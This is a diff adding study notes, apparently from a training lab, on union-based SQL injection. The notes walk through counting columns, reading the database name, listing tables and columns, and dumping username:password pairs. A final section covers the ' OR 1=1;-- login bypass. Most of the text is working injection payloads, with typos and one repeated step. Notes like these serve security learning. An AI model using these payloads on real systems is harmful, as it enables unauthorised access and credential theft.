@@ -1,0 +1,84 @@
+1. Get sql injection error or confirm that there the injection is possible.
+
+
+
+2. Know the number of columns, by using UNION query.
+
+UNION SELECT 1
+If doesn't works
+UNION SELECT 1,2
+IF dosen't works 
+UNION SELECT 1
+
+Keep repeating it until you match the column number.
+UNION SELECT 1,2,3,4....
+
+Example: 
+https://website.thm/article?id=0 Union select 1,2,3
+
+
+
+3. Get the database name:
+
+Union select 1,2,database()
+
+Remove the last column number and add "database()" there, it will tell you the database name.
+
+Example: 
+https://website.thm/article?id=0 Union select 1,2,database()
+
+
+
+4. Gather list of tables that are in this database:
+
+After the STEP 3 you will get a database name, Now use that name to get list of tables under that databse:
+
+UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '$database_name_here'
+
+Example:
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database1'
+
+
+
+5. Find the structure of the table (Column names) you got from the STEP 4:
+
+After STEP 4 you will get some table names, the  using that find Column names:
+
+UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '$table_name_here'
+
+Example: 
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'tableno1'
+
+
+
+6. Reterive the information form the column names that you got from STEP 5:
+
+Let, you got 3 columns from STEP 5,
+id, username, password
+Now to retrive them use below query:
+
+UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM $table_name_here
+
+Example:
+https://website.thm/article?id= 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM tableno1
+
+
+
+
+=================================================================================Bypassing Login Form=======================
+==============================================================
+
+
+Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
+
+Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.
+
+Query:
+
+' OR 1=1;--
+
+Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.
+
+
+
+
